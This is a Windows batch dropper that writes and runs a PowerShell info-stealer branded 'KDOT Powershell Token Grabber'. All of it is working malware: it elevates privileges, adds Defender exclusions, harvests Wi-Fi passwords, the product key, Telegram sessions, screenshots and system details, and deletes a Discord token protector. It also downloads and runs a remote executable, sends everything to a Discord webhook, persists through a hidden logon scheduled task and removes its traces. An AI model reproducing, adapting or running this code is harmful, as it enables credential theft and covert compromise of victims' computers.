@echo off

net session >nul 2>&1
if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
cd /d %~dp0

echo function CHECK_IF_ADMIN { > powershell123.ps1
echo $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test >> powershell123.ps1
echo } >> powershell123.ps1
echo function EXFILTRATE-DATA { >> powershell123.ps1
echo $webhook = "YOUR_WEBHOOK_HERE" >> powershell123.ps1
echo $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing >> powershell123.ps1
echo $ip = $ip.Content >> powershell123.ps1
echo $ip ^> $env:LOCALAPPDATA\Temp\ip.txt >> powershell123.ps1
echo $lang = (Get-WinUserLanguageList).LocalizedName >> powershell123.ps1
echo $date = (get-date).toString("r") >> powershell123.ps1
echo Get-ComputerInfo ^> $env:LOCALAPPDATA\Temp\system_info.txt >> powershell123.ps1
echo $osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption >> powershell123.ps1
echo $osbuild = (Get-ItemProperty -Path c:\windows\system32\hal.dll).VersionInfo.FileVersion >> powershell123.ps1
echo $displayversion = (Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue('DisplayVersion') >> powershell123.ps1
echo $model = (Get-WmiObject -Class:Win32_ComputerSystem).Model >> powershell123.ps1
echo $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct ^| Select-Object -ExpandProperty UUID >> powershell123.ps1
echo $uuid ^> $env:LOCALAPPDATA\Temp\uuid.txt >> powershell123.ps1
echo $cpu = Get-WmiObject -Class Win32_Processor ^| Select-Object -ExpandProperty Name >> powershell123.ps1
echo $cpu ^> $env:LOCALAPPDATA\Temp\cpu.txt >> powershell123.ps1
echo $gpu = (Get-WmiObject Win32_VideoController).Name >> powershell123.ps1
echo $gpu ^> $env:LOCALAPPDATA\Temp\GPU.txt >> powershell123.ps1
echo $format = " GB" >> powershell123.ps1
echo $total = Get-CimInstance Win32_PhysicalMemory ^| Measure-Object -Property capacity -Sum ^| Foreach {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))} >> powershell123.ps1
echo $raminfo = "$total" + "$format" >> powershell123.ps1
echo $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME ^| Where{$_.IpEnabled -Match "True"} ^| Select-Object -Expand macaddress) -join "," >> powershell123.ps1
echo $mac ^> $env:LOCALAPPDATA\Temp\mac.txt >> powershell123.ps1
echo $username = $env:USERNAME >> powershell123.ps1
echo $hostname = $env:COMPUTERNAME >> powershell123.ps1
echo $netstat = netstat -ano ^> $env:LOCALAPPDATA\Temp\netstat.txt >> powershell123.ps1
echo $mfg = (gwmi win32_computersystem).Manufacturer >> powershell123.ps1
echo # System Uptime >> powershell123.ps1
echo function Get-Uptime { >> powershell123.ps1
echo $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime >> powershell123.ps1
echo $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds >> powershell123.ps1
echo $uptimedata >> powershell123.ps1
echo } >> powershell123.ps1
echo $uptime = Get-Uptime >> powershell123.ps1
echo # List of Installed AVs >> powershell123.ps1
echo function get-installed-av { >> powershell123.ps1
echo $wmiQuery = "SELECT * FROM AntiVirusProduct" >> powershell123.ps1
echo $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters >> powershell123.ps1
echo $AntivirusProduct.displayName >> powershell123.ps1
echo } >> powershell123.ps1
echo $avlist = get-installed-av -autosize ^| ft ^| out-string >> powershell123.ps1
echo $wifipasslist = netsh wlan show profiles ^| Select-String "\:(.+)$" ^| %%{$name=$_.Matches.Groups[1].Value.Trim(); $_} ^| %%{(netsh wlan show profile name="$name" key=clear)}  ^| Select-String "Key Content\W+\:(.+)$" ^| %%{$pass=$_.Matches.Groups[1].Value.Trim(); $_} ^| %%{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} ^| out-string >> powershell123.ps1
echo $wifi = $wifipasslist ^| out-string >> powershell123.ps1
echo $wifi ^> $env:temp\WIFIPasswords.txt >> powershell123.ps1
echo # Screen Resolution >> powershell123.ps1
echo $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[0] >> powershell123.ps1
echo $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[2] >> powershell123.ps1
echo $split = "x" >> powershell123.ps1
echo $screen = "$width" + "$split" + "$height" >> powershell123.ps1
echo $screen >> powershell123.ps1
echo Get-CimInstance Win32_StartupCommand ^| Select-Object Name, command, Location, User ^| Format-List ^> $env:temp\StartUpApps.txt >> powershell123.ps1
echo Get-WmiObject win32_service ^|? State -match "running" ^| select Name, DisplayName, PathName, User ^| sort Name ^| ft -wrap -autosize ^>  $env:LOCALAPPDATA\Temp\running-services.txt >> powershell123.ps1
echo Get-WmiObject win32_process ^| Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path ^| ft -wrap -autosize ^> $env:temp\running-applications.txt >> powershell123.ps1
echo Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* ^| Select-Object DisplayName, DisplayVersion, Publisher, InstallDate ^| Format-Table ^> $env:temp\Installed-Applications.txt >> powershell123.ps1
echo Get-NetAdapter ^| ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize ^> $env:temp\NetworkAdapters.txt >> powershell123.ps1
echo # Telegram Session Stealer >> powershell123.ps1
echo function telegramstealer { >> powershell123.ps1
echo $processName = "telegram" >> powershell123.ps1
echo try { >> powershell123.ps1
echo if (Get-Process $processName -ErrorAction SilentlyContinue) { >> powershell123.ps1
echo Get-Process -Name $processName ^| Stop-Process >> powershell123.ps1
echo } >> powershell123.ps1
echo } catch { >> powershell123.ps1
echo } >> powershell123.ps1
echo $path = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata" >> powershell123.ps1
echo $destination = "$env:localappdata\temp\telegram-session.zip" >> powershell123.ps1
echo $exclude = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview") >> powershell123.ps1
echo $files = Get-ChildItem -Path $path -Exclude $exclude >> powershell123.ps1
echo Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest >> powershell123.ps1
echo } >> powershell123.ps1
echo telegramstealer >> powershell123.ps1
echo # Desktop screenshot >> powershell123.ps1
echo Add-Type -AssemblyName System.Windows.Forms,System.Drawing >> powershell123.ps1
echo $screens = [Windows.Forms.Screen]::AllScreens >> powershell123.ps1
echo $top    = ($screens.Bounds.Top    ^| Measure-Object -Minimum).Minimum >> powershell123.ps1
echo $left   = ($screens.Bounds.Left   ^| Measure-Object -Minimum).Minimum >> powershell123.ps1
echo $width  = ($screens.Bounds.Right  ^| Measure-Object -Maximum).Maximum >> powershell123.ps1
echo $height = ($screens.Bounds.Bottom ^| Measure-Object -Maximum).Maximum >> powershell123.ps1
echo $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height) >> powershell123.ps1
echo $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height) >> powershell123.ps1
echo $graphics = [Drawing.Graphics]::FromImage($bmp) >> powershell123.ps1
echo $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size) >> powershell123.ps1
echo $bmp.Save("$env:localappdata\temp\desktop-screenshot.png") >> powershell123.ps1
echo $graphics.Dispose() >> powershell123.ps1
echo $bmp.Dispose() >> powershell123.ps1
echo function diskdata { >> powershell123.ps1
echo $disks = get-wmiobject -class "Win32_LogicalDisk" -namespace "root\CIMV2" >> powershell123.ps1
echo $results = foreach ($disk in $disks) { >> powershell123.ps1
echo if ($disk.Size -gt 0) { >> powershell123.ps1
echo $SizeOfDisk = [math]::round($disk.Size/1GB, 0) >> powershell123.ps1
echo $FreeSpace = [math]::round($disk.FreeSpace/1GB, 0) >> powershell123.ps1
echo $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2) >> powershell123.ps1
echo [int]$FreePercent = ($FreeSpace/$SizeOfDisk) * 100 >> powershell123.ps1
echo [int]$usedpercent = ($usedspace/$SizeOfDisk) * 100 >> powershell123.ps1
echo [PSCustomObject]@{ >> powershell123.ps1
echo Drive = $disk.Name >> powershell123.ps1
echo Name = $disk.VolumeName >> powershell123.ps1
echo "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk >> powershell123.ps1
echo "Free Disk Size" = "{0:N0} GB ({1:N0} %%)" -f $FreeSpace, ($FreePercent) >> powershell123.ps1
echo "Used Space" = "{0:N0} GB ({1:N0} %%)" -f $usedspace, ($usedpercent) >> powershell123.ps1
echo } >> powershell123.ps1
echo } >> powershell123.ps1
echo } >> powershell123.ps1
echo $results ^| out-string >> powershell123.ps1
echo } >> powershell123.ps1
echo $alldiskinfo = diskdata >> powershell123.ps1
echo $alldiskinfo ^> $env:temp\DiskInfo.txt >> powershell123.ps1
echo function Get-ProductKey { >> powershell123.ps1
echo $map="BCDFGHJKMPQRTVWXY2346789" >> powershell123.ps1
echo $value = (get-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").digitalproductid[0x34..0x42] >> powershell123.ps1
echo $ProductKey = "" >> powershell123.ps1
echo for ($i = 24; $i -ge 0; $i--) { >> powershell123.ps1
echo $r = 0 >> powershell123.ps1
echo for ($j = 14; $j -ge 0; $j--) { >> powershell123.ps1
echo $r = ($r * 256) -bxor $value[$j] >> powershell123.ps1
echo $value[$j] = [math]::Floor([double]($r / 24)) >> powershell123.ps1
echo $r = $r %% 24 >> powershell123.ps1
echo } >> powershell123.ps1
echo $ProductKey = $map[$r] + $ProductKey >> powershell123.ps1
echo if (($i %% 5) -eq 0 -and $i -ne 0) { >> powershell123.ps1
echo $ProductKey = "-" + $ProductKey >> powershell123.ps1
echo } >> powershell123.ps1
echo } >> powershell123.ps1
echo $ProductKey >> powershell123.ps1
echo } >> powershell123.ps1
echo $ProductKey = Get-ProductKey >> powershell123.ps1
echo Get-ProductKey ^> $env:localappdata\temp\ProductKey.txt >> powershell123.ps1
echo $embed_and_body = @{ >> powershell123.ps1
echo "username" = "KDOT" >> powershell123.ps1
echo "content" = "@everyone" >> powershell123.ps1
echo "title" = "KDOT" >> powershell123.ps1
echo "description" = "Powerful Token Grabber" >> powershell123.ps1
echo "color" = "16711680" >> powershell123.ps1
echo "avatar_url" = "https://i.postimg.cc/m2SSKrBt/Logo.gif" >> powershell123.ps1
echo "url" = "https://discord.gg/vk3rBhcj2y" >> powershell123.ps1
echo "embeds" = @( >> powershell123.ps1
echo @{ >> powershell123.ps1
echo "title" = "POWERSHELL GRABBER" >> powershell123.ps1
echo "url" = "https://github.com/KDot227/Powershell-Token-Grabber/tree/main" >> powershell123.ps1
echo "description" = "New victim info collected !" >> powershell123.ps1
echo "color" = "16711680" >> powershell123.ps1
echo "footer" = @{ >> powershell123.ps1
echo "text" = "Made by KDOT, GODFATHER and CHAINSKI" >> powershell123.ps1
echo } >> powershell123.ps1
echo "thumbnail" = @{ >> powershell123.ps1
echo "url" = "https://i.postimg.cc/m2SSKrBt/Logo.gif" >> powershell123.ps1
echo } >> powershell123.ps1
echo "fields" = @( >> powershell123.ps1
echo @{ >> powershell123.ps1
echo "name" = ":satellite: IP" >> powershell123.ps1
echo "value" = "``````$ip``````" >> powershell123.ps1
echo }, >> powershell123.ps1
echo @{ >> powershell123.ps1
echo "name" = ":bust_in_silhouette: User Information" >> powershell123.ps1
echo "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````" >> powershell123.ps1
echo }, >> powershell123.ps1
echo @{ >> powershell123.ps1
echo "name" = ":shield: Antivirus" >> powershell123.ps1
echo "value" = "``````$avlist``````" >> powershell123.ps1
echo }, >> powershell123.ps1
echo @{ >> powershell123.ps1
echo "name" = ":computer: Hardware" >> powershell123.ps1
echo "value" = "``````Screen Size: $screen `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````" >> powershell123.ps1
echo }, >> powershell123.ps1
echo @{ >> powershell123.ps1
echo "name" = ":floppy_disk: Disk" >> powershell123.ps1
echo "value" = "``````$alldiskinfo``````" >> powershell123.ps1
echo } >> powershell123.ps1
echo @{ >> powershell123.ps1
echo "name" = ":signal_strength: WiFi" >> powershell123.ps1
echo "value" = "``````$wifi``````" >> powershell123.ps1
echo } >> powershell123.ps1
echo ) >> powershell123.ps1
echo } >> powershell123.ps1
echo ) >> powershell123.ps1
echo } >> powershell123.ps1
echo $payload = $embed_and_body ^| ConvertTo-Json -Depth 10 >> powershell123.ps1
echo Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing ^| Out-Null >> powershell123.ps1
echo # Screenshot Embed >> powershell123.ps1
echo curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$env:localappdata\temp\desktop-screenshot.png\`"" $webhook ^| out-null >> powershell123.ps1
echo Set-Location $env:LOCALAPPDATA\Temp >> powershell123.ps1
echo $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" >> powershell123.ps1
echo if ($token_prot -eq $true) { >> powershell123.ps1
echo Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force >> powershell123.ps1
echo } >> powershell123.ps1
echo $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat" >> powershell123.ps1
echo if ($secure_dat -eq $true) { >> powershell123.ps1
echo Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force >> powershell123.ps1
echo } >> powershell123.ps1
echo $TEMP_KOT = Test-Path "$env:LOCALAPPDATA\Temp\KDOT" >> powershell123.ps1
echo if ($TEMP_KOT -eq $false) { >> powershell123.ps1
echo New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory >> powershell123.ps1
echo } >> powershell123.ps1
echo $ProgressPreference = "SilentlyContinue";Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.1/main.exe" -OutFile "main.exe" -UseBasicParsing >> powershell123.ps1
echo $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru >> powershell123.ps1
echo $proc.WaitForExit() >> powershell123.ps1
echo $extracted = "$env:LOCALAPPDATA\Temp" >> powershell123.ps1
echo Move-Item -Path "$extracted\ip.txt" -Destination "$extracted\KDOT\ip.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\netstat.txt" -Destination "$extracted\KDOT\netstat.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\system_info.txt" -Destination "$extracted\KDOT\system_info.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\uuid.txt" -Destination "$extracted\KDOT\uuid.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\mac.txt" -Destination "$extracted\KDOT\mac.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\KDOT\browser-cookies.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\KDOT\browser-history.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\KDOT\browser-passwords.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\KDOT\desktop-screenshot.png" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\KDOT\tokens.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\KDOT\WIFIPasswords.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\KDOT\GPU.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\Installed-Applications.txt" -Destination "$extracted\KDOT\Installed-Applications.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\DiskInfo.txt" -Destination "$extracted\KDOT\DiskInfo.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\CPU.txt" -Destination "$extracted\KDOT\CPU.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\NetworkAdapters.txt" -Destination "$extracted\KDOT\NetworkAdapters.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\ProductKey.txt" -Destination "$extracted\KDOT\ProductKey.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\KDOT\StartUpApps.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\telegram-session.zip" -Destination "$extracted\KDOT\telegram-session.zip" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force >> powershell123.ps1
echo curl.exe -X POST -F 'payload_json={\"username\": \"POWERSHELL GRABBER\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/m2SSKrBt/Logo.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook >> powershell123.ps1
echo Remove-Item "$extracted\KDOT.zip" >> powershell123.ps1
echo Remove-Item "$extracted\KDOT" -Recurse >> powershell123.ps1
echo Remove-Item "$extracted\main.exe" >> powershell123.ps1
echo } >> powershell123.ps1
echo function Invoke-TASKS { >> powershell123.ps1
echo Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" >> powershell123.ps1
echo Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT" >> powershell123.ps1
echo New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force >> powershell123.ps1
echo $origin = $PSCommandPath >> powershell123.ps1
echo Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force >> powershell123.ps1
echo $task_name = "KDOT" >> powershell123.ps1
echo $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %%appdata%%\kdot\kdot.ps1",0)(window.close)' >> powershell123.ps1
echo $task_trigger = New-ScheduledTaskTrigger -AtLogOn >> powershell123.ps1
echo $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable >> powershell123.ps1
echo Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force >> powershell123.ps1
echo EXFILTRATE-DATA >> powershell123.ps1
echo } >> powershell123.ps1
echo function Request-Admin { >> powershell123.ps1
echo while(!(CHECK_IF_ADMIN)) { >> powershell123.ps1
echo try { >> powershell123.ps1
echo Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -File `"$PSCommandPath`"" -Verb RunAs >> powershell123.ps1
echo exit >> powershell123.ps1
echo } >> powershell123.ps1
echo catch {} >> powershell123.ps1
echo } >> powershell123.ps1
echo } >> powershell123.ps1
echo function Hide-Console >> powershell123.ps1
echo { >> powershell123.ps1
echo if (-not ("Console.Window" -as [type])) { >> powershell123.ps1
echo Add-Type -Name Window -Namespace Console -MemberDefinition ' >> powershell123.ps1
echo [DllImport("Kernel32.dll")] >> powershell123.ps1
echo public static extern IntPtr GetConsoleWindow(); >> powershell123.ps1
echo [DllImport("user32.dll")] >> powershell123.ps1
echo public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow); >> powershell123.ps1
echo ' >> powershell123.ps1
echo } >> powershell123.ps1
echo $consolePtr = [Console.Window]::GetConsoleWindow() >> powershell123.ps1
echo $null = [Console.Window]::ShowWindow($consolePtr, 0) >> powershell123.ps1
echo } >> powershell123.ps1
echo if (CHECK_IF_ADMIN -eq $true) { >> powershell123.ps1
echo Hide-Console >> powershell123.ps1
echo Invoke-TASKS >> powershell123.ps1
echo # Self-Destruct >> powershell123.ps1
echo # Remove-Item $PSCommandPath -Force >> powershell123.ps1
echo } else { >> powershell123.ps1
echo Write-Host ("Please run as admin!") -ForegroundColor Red >> powershell123.ps1
echo Start-Sleep -s 1 >> powershell123.ps1
echo Request-Admin >> powershell123.ps1
echo } >> powershell123.ps1
powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
powershell.exe -noprofile -executionpolicy bypass -WindowStyle hidden -file powershell123.ps1
del powershell123.ps1 /f /q
timeout 3 > nul
exit